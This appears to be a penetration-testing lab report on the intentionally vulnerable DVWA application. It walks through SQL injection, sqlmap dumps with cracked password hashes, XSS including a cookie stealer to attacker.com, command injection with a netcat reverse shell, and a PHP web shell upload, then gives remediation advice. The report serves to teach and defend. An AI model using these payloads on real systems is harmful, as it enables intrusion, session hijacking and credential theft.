# 🔐 DVWA Web Application Penetration Testing

> **Author:** Yash Raikar  
> **Target:** Damn Vulnerable Web Application (DVWA)  
> **Environment:** Metasploitable 2 (Local Lab)  
> **Date:** April 2026  
> **Security Level:** Low  

---

## ⚠️ Disclaimer

> This penetration test was conducted on **DVWA (Damn Vulnerable Web Application)**, an intentionally vulnerable application running in a **controlled local lab environment** on Metasploitable 2.  
> All techniques demonstrated here are **strictly for educational purposes only**.  
> Never attempt these techniques on systems you do not own or have explicit written permission to test.

---

## 📋 Table of Contents

1. [Introduction](#introduction)
2. [Environment Setup](#environment-setup)
3. [SQL Injection](#1-sql-injection)
4. [Blind SQL Injection](#2-blind-sql-injection)
5. [SQL Injection Automation (SQLMap)](#3-sql-injection-automation-sqlmap)
6. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
7. [Command Injection](#5-command-injection)
8. [File Upload Attack](#6-file-upload-attack)
9. [Burp Suite – HTTP Interception](#7-burp-suite--http-interception)
10. [Risk Summary](#risk-summary)
11. [Recommendations](#recommendations)

---

## Introduction

**DVWA (Damn Vulnerable Web Application)** is a PHP/MySQL web application designed for security professionals to practice common web vulnerabilities in a legal and safe environment.

This report documents the identification and exploitation of the following vulnerabilities:

| # | Vulnerability | Severity |
|---|--------------|----------|
| 1 | SQL Injection | 🔴 Critical |
| 2 | Blind SQL Injection | 🔴 Critical |
| 3 | Cross-Site Scripting (XSS) | 🟠 High |
| 4 | Command Injection | 🔴 Critical |
| 5 | File Upload | 🔴 Critical |

---

## Environment Setup

| Detail | Value |
|--------|-------|
| Target IP | 172.20.10.13 |
| Attacker IP | 172.20.10.12 |
| Application URL | http://172.20.10.13/dvwa |
| Default Credentials | admin : password |
| Security Level | Low |

**Login to DVWA:**
```
URL      : http://172.20.10.13/dvwa/login.php
Username : admin
Password : password
```

**Set Security Level to Low:**
```
Navigate to: DVWA Security → Select Low → Submit
```

---

## 1. SQL Injection

### What is SQL Injection?
SQL Injection occurs when user-supplied input is inserted directly into a SQL query without proper sanitization. An attacker can manipulate the query to extract, modify, or delete data from the database.

### Location
```
DVWA → SQL Injection
URL  : http://172.20.10.13/dvwa/vulnerabilities/sqli/
```

### Step 1: Confirm Vulnerability

Enter a single quote in the input field:
```
'
```

**Output:**
```
You have an error in your SQL syntax...
```

✅ The error confirms the input is being passed directly into a SQL query — **SQL Injection confirmed.**

### Step 2: Extract All Users

```sql
1' OR '1'='1
```

**Output:** All 5 users returned from the database.

**Why it works:**  
The query becomes:
```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1';
```
Since `'1'='1'` is always true, all records are returned.

### Step 3: Dump Usernames and Password Hashes (UNION Attack)

```sql
' UNION SELECT user, password FROM users#
```

**Output:**

| Username | Password Hash |
|----------|--------------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

**How UNION works:**
```
Original query → SELECT first_name, last_name FROM users
Our injection  → UNION SELECT user, password FROM users
Result         → Both queries combined, credentials dumped!
# at the end  → Comments out the rest of the query
```

### Step 4: Crack the Hashes

Using [CrackStation](https://crackstation.net):

| Hash | Algorithm | Cracked Password |
|------|-----------|-----------------|
| 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 | password |
| e99a18c428cb38d5f260853678922e03 | MD5 | abc123 |
| 0d107d09f5bbe40cade3de5c71e9e9b7 | MD5 | letmein |

---

## 2. Blind SQL Injection

### What is Blind SQL Injection?
Unlike regular SQL Injection, Blind SQLi returns **no visible output**. Instead, the attacker asks the database true/false questions and infers data based on the application's behavior.

### Location
```
DVWA → SQL Injection (Blind)
URL  : http://172.20.10.13/dvwa/vulnerabilities/sqli_blind/
```

### Types of Blind SQL Injection

| Type | Method |
|------|--------|
| Boolean-Based | Page content changes based on TRUE/FALSE condition |
| Time-Based | Database delays response if condition is TRUE |

### Boolean-Based Testing

**TRUE condition (returns data):**
```sql
1' AND '1'='1
```
✅ User data appears

**FALSE condition (returns nothing):**
```sql
1' AND '1'='2
```
❌ No data returned

**Why it works:**
```
TRUE  condition → page shows data    = YES
FALSE condition → page shows nothing = NO

We can ask YES/NO questions to extract data
character by character!
```

### Time-Based Testing

```sql
1' AND SLEEP(5)-- -
```

If the page takes 5 seconds to load → condition is TRUE.

**Real world use:**  
Time-based SQLi is used when the page content **never changes** regardless of input — only the response time gives the attacker information.

---

## 3. SQL Injection Automation (SQLMap)

### What is SQLMap?
SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities.

### Step 1: Get Session Cookie

```
Firefox → F12 → Application → Cookies → Copy PHPSESSID value
```

### Step 2: Run SQLMap – Enumerate Databases

```bash
sqlmap -u "http://172.20.10.13/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<your_session_id>; security=low" \
--dbs
```

**Output:**
```
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195
```

### Step 3: Dump Users Table

```bash
sqlmap -u "http://172.20.10.13/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<your_session_id>; security=low" \
-D dvwa -T users --dump
```

**SQLMap automatically:**
- Detected the injection point
- Identified the database type (MySQL)
- Dumped all usernames and password hashes
- Attempted to crack the hashes

### Manual vs Automated

| Approach | Pros | Cons |
|----------|------|------|
| Manual | Deep understanding, OSCP-friendly | Slow |
| SQLMap | Fast, comprehensive | Less control |

> 💡 **Best Practice:** Always test manually first to understand the vulnerability, then use SQLMap for efficiency in real engagements.

---

## 4. Cross-Site Scripting (XSS)

### What is XSS?
XSS occurs when an attacker injects malicious JavaScript into a web page that is then executed in other users' browsers. Unlike SQL Injection (which targets the database), XSS **targets the user's browser**.

### Types of XSS

| Type | Description | Impact |
|------|-------------|--------|
| Reflected | Script in URL, executes once | Single user |
| Stored | Script saved in database, executes for everyone | All visitors |
| DOM-Based | Manipulation of browser DOM | Single user |

---

### A. Reflected XSS

**Location:**
```
DVWA → XSS (Reflected)
URL  : http://172.20.10.13/dvwa/vulnerabilities/xss_r/
```

**Payload:**
```html
<script>alert('XSS')</script>
```

**Output:** JavaScript alert popup appears.

**Why it works:**  
The input is reflected back to the page without sanitization. The browser interprets the `<script>` tag and executes the JavaScript.

---

### B. Stored XSS

**Location:**
```
DVWA → XSS (Stored)
URL  : http://172.20.10.13/dvwa/vulnerabilities/xss_s/
```

**Payload (in message field):**
```html
<script>alert('Stored XSS')</script>
```

**Output:** Alert popup appears every time ANY user visits the guestbook page.

**Why Stored XSS is more dangerous:**
```
Reflected XSS → Executes once for one user
Stored XSS    → Saved in database, executes for EVERY visitor automatically
```

**Real World Attack (Cookie Stealer):**
```html
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie
</script>
```
This sends every visitor's session cookie to the attacker — enabling account takeover without needing a password.

---

## 5. Command Injection

### What is Command Injection?
Command Injection occurs when user-supplied input is passed to a system shell command without proper sanitization. The attacker can execute arbitrary OS commands on the server.

### Location
```
DVWA → Command Execution
URL  : http://172.20.10.13/dvwa/vulnerabilities/exec/
```

### Step 1: Normal Usage

```
Input: 172.20.10.13
```

**Output:** Standard ping results — the server runs `ping -c 3 172.20.10.13`

### Step 2: Inject OS Command

The `;` character allows chaining commands in Linux:

```bash
172.20.10.13; whoami
```

**Output:**
```
[ping results]
www-data
```

✅ The `whoami` command executed on the server!

### Step 3: Extract Sensitive Data

```bash
172.20.10.13; cat /etc/passwd
```

**Output:** Full contents of `/etc/passwd` — revealing all system users.

### Step 4: Get Reverse Shell

**On Kali (listener):**
```bash
nc -nlvp 5555
```

**Injected payload:**
```bash
172.20.10.13; nc -e /bin/sh 172.20.10.12 5555
```

**Result:** Full reverse shell on the web server!

**Why it works:**
```
Application runs: ping -c 3 [USER_INPUT]
Our input:        172.20.10.13; nc -e /bin/sh 172.20.10.12 5555
Final command:    ping -c 3 172.20.10.13; nc -e /bin/sh 172.20.10.12 5555
                                        ↑
                              ; chains commands!
```

---

## 6. File Upload Attack

### What is a File Upload Vulnerability?
When a web application allows file uploads without proper validation, an attacker can upload malicious files (like PHP web shells) that execute on the server.

### Location
```
DVWA → Upload
URL  : http://172.20.10.13/dvwa/vulnerabilities/upload/
```

### Step 1: Create PHP Web Shell

```bash
nano shell.php
```

```php
<?php system($_GET['cmd']); ?>
```

**How it works:**
```
system()       → executes OS commands
$_GET['cmd']   → reads 'cmd' parameter from URL

Usage: shell.php?cmd=whoami → runs whoami on server
```

### Step 2: Upload the Shell

Upload `shell.php` via the DVWA upload form.

**Output:**
```
../../hackable/uploads/shell.php successfully uploaded!
```

### Step 3: Access the Shell

```
http://172.20.10.13/dvwa/hackable/uploads/shell.php?cmd=whoami
```

**Output:** `www-data`

### Step 4: Run Any Command

| URL | Result |
|-----|--------|
| `?cmd=whoami` | Current user |
| `?cmd=id` | User ID and groups |
| `?cmd=ls /` | List root directory |
| `?cmd=cat /etc/passwd` | Read system users |
| `?cmd=uname -a` | Kernel version |

---

## 7. Burp Suite – HTTP Interception

### What is Burp Suite?
Burp Suite is the industry-standard web application security testing tool. It acts as a proxy between the browser and the server, allowing the tester to **intercept, modify, and replay HTTP requests**.

```
Normal:          Browser → Request → Server
With Burp Suite: Browser → Request → BURP → Server
                                       ↑
                                 Modify here!
```

### Setup

1. Open Burp Suite: `burpsuite` in terminal
2. Configure Firefox proxy: `127.0.0.1:8080`
3. Install Burp CA Certificate for HTTPS interception
4. Enable Intercept: `Proxy → Intercept → ON`

### Key Features Used

#### Intercept
Captures every HTTP request before it reaches the server. Allows real-time modification of parameters, headers, and cookies.

**Example:** Changed `id=1` to `id=2` in an intercepted request → server returned user 2's data.

#### Repeater
Send a request multiple times with modifications — without going back to the browser.

**SQL Injection via Repeater:**
```
GET /dvwa/vulnerabilities/sqli/?id=1+OR+1=1&Submit=Submit HTTP/1.1
Host: 172.20.10.13
Cookie: security=low; PHPSESSID=<session_id>
```

**Output:** All users returned from the database.

#### URL Encoding in Burp
Special characters must be URL-encoded in requests:

| Character | URL Encoded |
|-----------|------------|
| `'` | `%27` |
| `=` | `%3D` |
| `#` | `%23` |
| ` ` (space) | `+` or `%20` |

---

## Risk Summary

| Vulnerability | Severity | Impact |
|--------------|----------|--------|
| SQL Injection | 🔴 Critical | Full database compromise, credential theft |
| Blind SQL Injection | 🔴 Critical | Stealthy data extraction |
| Stored XSS | 🟠 High | Session hijacking, affects all users |
| Reflected XSS | 🟡 Medium | Session hijacking, single user |
| Command Injection | 🔴 Critical | Full server compromise, reverse shell |
| File Upload | 🔴 Critical | Remote code execution, server takeover |

---

## Recommendations

| # | Vulnerability | Recommendation |
|---|--------------|----------------|
| 1 | SQL Injection | Use parameterized queries / prepared statements. Never concatenate user input into SQL queries. |
| 2 | XSS | Sanitize and encode all user input. Implement Content Security Policy (CSP). |
| 3 | Command Injection | Never pass user input to system commands. Use safe APIs instead. |
| 4 | File Upload | Validate file type, extension, and content. Rename uploaded files. Store outside web root. |
| 5 | General | Keep all software updated. Implement WAF (Web Application Firewall). Regular security audits. |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP interception and manipulation |
| SQLMap | Automated SQL injection |
| Netcat | Reverse shell listener |
| CrackStation | Online hash cracking |
| Firefox DevTools | Cookie extraction, request analysis |

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [SQLMap Documentation](https://sqlmap.org/)

---

> **Note:** All testing was performed in a **controlled lab environment** on an intentionally vulnerable application. These techniques should only be used ethically and legally with proper authorization.

---

*Report by Yash Raikar | April 2026*
